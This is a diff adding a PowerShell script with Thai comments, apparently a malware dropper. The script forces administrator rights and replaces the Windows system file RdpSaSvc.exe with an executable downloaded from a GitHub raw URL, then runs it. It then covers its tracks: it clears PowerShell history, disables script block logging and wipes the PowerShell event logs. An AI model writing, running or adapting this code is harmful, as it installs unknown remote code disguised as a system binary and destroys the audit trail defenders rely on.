@@ -1,0 +1,86 @@
+# --- FORCE RUN AS ADMINISTRATOR ---
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
+
+# --- CONFIG ---
+$url      = "https://raw.githubusercontent.com/18321-creator/Pro/refs/heads/main/updateweb.exe"
+$path     = "C:\Windows\System32\RdpSaSvc.exe"
+$procName = [System.IO.Path]::GetFileNameWithoutExtension($path)
+
+# --- ขั้น 1: ลบไฟล์เก่าถ้ามีอยู่ (aggressive: cmd del + takeown) ---
+if (Test-Path $path) {
+    # ถอน ownership จาก TrustedInstaller ก่อน
+    & cmd /c "takeown /f `"$path`" /a" 2>$null | Out-Null
+    & cmd /c "icacls `"$path`" /grant Administrators:F /c /q" 2>$null | Out-Null
+    Start-Sleep -Milliseconds 200
+
+    # ลองลบหลายวิธี
+    $deleted = $false
+
+    # วิธี 1: Remove-Item
+    try { Remove-Item $path -Force -ErrorAction Stop; $deleted = $true } catch {}
+
+    # วิธี 2: cmd del
+    if (-not $deleted) {
+        & cmd /c "del /f /q `"$path`"" 2>$null | Out-Null
+        if (-not (Test-Path $path)) { $deleted = $true }
+    }
+
+    # วิธี 3: Rename แล้ว delete (bypass file lock)
+    if (-not $deleted) {
+        $tmp = "$env:TEMP\$procName_old.exe"
+        try {
+            Move-Item $path $tmp -Force -ErrorAction Stop
+            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
+            $deleted = $true
+        } catch {}
+    }
+
+    # ถ้าลบไม่ได้จริงๆ ก็ download ทับไปเลย (Invoke-WebRequest overwrite)
+}
+
+# --- ขั้น 3: โหลดไฟล์ใหม่ ---
+try {
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    Invoke-WebRequest $url -OutFile $path -UseBasicParsing -ErrorAction Stop
+} catch {
+    exit 1
+}
+
+# รอให้ไฟล์พร้อม
+Start-Sleep -Milliseconds 300
+if (-not (Test-Path $path)) { exit 1 }
+
+# --- ขั้น 4: เปิดแบบ Administrator ---
+# script รัน admin อยู่แล้ว ไม่ต้อง -Verb RunAs (ทำให้ fail บาง config)
+# ใช้ cmd /c start เพื่อ detach จาก process tree ปัจจุบัน
+& cmd /c "start `"`" `"$path`""
+
+# --- ขั้น 5: ล้าง logs + history แล้ว exit ---
+Start-Sleep -Seconds 2
+
+Clear-History
+try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() } catch {}
+
+$sbPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
+if (-not (Test-Path $sbPath)) { New-Item -Path $sbPath -Force | Out-Null }
+Set-ItemProperty -Path $sbPath -Name "EnableScriptBlockLogging" -Value 0 -ErrorAction SilentlyContinue
+
+foreach ($log in @("Microsoft-Windows-PowerShell/Operational", "Windows PowerShell")) {
+    try {
+        [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($log)
+        continue
+    } catch {}
+    try {
+        wevtutil sl "$log" /e:false 2>$null
+        wevtutil cl "$log"          2>$null
+        wevtutil sl "$log" /e:true  2>$null
+    } catch {}
+}
+
+$histPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+if (Test-Path $histPath) { Clear-Content $histPath -Force -ErrorAction SilentlyContinue }
+
+exit
